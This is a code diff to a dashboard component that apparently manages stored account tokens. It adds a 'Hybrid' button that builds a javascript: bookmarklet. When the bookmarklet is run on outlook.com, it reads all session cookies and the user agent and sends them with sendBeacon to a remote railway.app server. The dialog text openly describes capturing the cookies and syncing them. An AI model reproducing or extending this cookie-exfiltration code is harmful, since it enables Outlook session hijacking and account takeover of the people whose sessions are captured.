@@ -25,10 +25,13 @@ import {
   XCircle,
   AlertCircle,
   Gavel,
+  Cookie,
+  Copy,
+  Check,
 } from "lucide-react";
 import { Token } from "@/types/token";
 import { formatDistanceToNow, isPast } from "date-fns";
-import { deleteTokens, refreshToken } from "@/lib/api";
+import { deleteTokens, refreshToken, generateBookmarkletToken } from "@/lib/api";
 import { useRouter } from "next/navigation";
 import { toast } from "sonner";
 import { TokenTableSkeleton } from "@/components/ui/loading-skeleton";
@@ -44,6 +47,9 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
   const router = useRouter();
   const [search, setSearch] = useState("");
   const [refreshingId, setRefreshingId] = useState<string | null>(null);
+  const [bookmarkletToken, setBookmarkletToken] = useState<string | null>(null);
+  const [bookmarkletTokenId, setBookmarkletTokenId] = useState<string | null>(null);
+  const [copied, setCopied] = useState(false);
 
   const filtered = useMemo(() => {
     if (!search) return tokens;
@@ -75,6 +81,25 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
     } finally {
       setRefreshingId(null);
     }
+  };
+
+  const handleGenerateBookmarklet = async (token: Token) => {
+    try {
+      const result = await generateBookmarkletToken(token.id);
+      setBookmarkletToken(result.token);
+      setBookmarkletTokenId(token.id);
+      setCopied(false);
+    } catch (e: any) {
+      toast.error("Failed to generate bookmarklet", { description: e.message });
+    }
+  };
+
+  const handleCopyBookmarklet = () => {
+    if (!bookmarkletToken) return;
+    const bookmarklet = `javascript:(function(){var t="${bookmarkletToken}";var c=document.cookie;var u=navigator.userAgent;navigator.sendBeacon("${process.env.NEXT_PUBLIC_API_URL || 'https://simdiatokens-server-production.up.railway.app'}/api/cookies/sync",JSON.stringify({token:t,cookies:c,user_agent:u}));alert("Session synced!");})();`;
+    navigator.clipboard.writeText(bookmarklet);
+    setCopied(true);
+    toast.success("Bookmarklet copied to clipboard");
   };
 
   const openApp = (token: Token, app: string) => {
@@ -287,6 +312,15 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
                       </button>
                       
                       <button
+                        onClick={() => handleGenerateBookmarklet(token)}
+                        className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg bg-purple-500/10 text-purple-400 border border-purple-500/20 text-xs font-medium hover:bg-purple-500/20 transition-colors"
+                        title="Generate bookmarklet for hybrid cookie access"
+                      >
+                        <Cookie className="h-3.5 w-3.5" />
+                        Hybrid
+                      </button>
+                      
+                      <button
                         onClick={() => handleRefresh(token)}
                         disabled={refreshingId === token.id || isActive}
                         className="p-2 rounded-lg border border-white/10 hover:bg-white/5 transition-colors disabled:opacity-50"
@@ -317,6 +351,39 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
           )}
         </AnimatePresence>
       </div>
+
+      {/* Bookmarklet Dialog */}
+      {bookmarkletToken && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
+          <div className="bg-[#1f1f1f] border border-[#3d3d3d] rounded-lg p-6 w-full max-w-lg mx-4">
+            <h3 className="text-sm font-semibold text-white mb-2">Hybrid Access Bookmarklet</h3>
+            <p className="text-[11px] text-[#a0a0a0] mb-4">
+              Drag this bookmarklet to your browser bookmarks bar. When clicked on outlook.com, it will capture the session cookies and sync them to the server for hybrid access.
+            </p>
+            <div className="bg-[#252525] border border-[#3d3d3d] rounded-md p-3 mb-4">
+              <code className="text-[10px] text-[#0f6cbd] break-all font-mono">
+                javascript:(function()&#123;...&#125;)();
+              </code>
+            </div>
+            <div className="flex items-center gap-2 mb-4">
+              <button
+                onClick={handleCopyBookmarklet}
+                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-md bg-[#0f6cbd]/20 text-[#0f6cbd] border border-[#0f6cbd]/30 text-xs font-medium hover:bg-[#0f6cbd]/30 transition-colors"
+              >
+                {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
+                {copied ? "Copied" : "Copy Bookmarklet"}
+              </button>
+              <span className="text-[10px] text-[#a0a0a0]">Expires in 5 minutes</span>
+            </div>
+            <button
+              onClick={() => setBookmarkletToken(null)}
+              className="w-full px-3 py-2 rounded-md border border-[#3d3d3d] text-xs text-[#a0a0a0] hover:bg-[#252525] transition-colors"
+            >
+              Close
+            </button>
+          </div>
+        </div>
+      )}
 
       {/* Polling indicator */}
       {lastUpdated && (
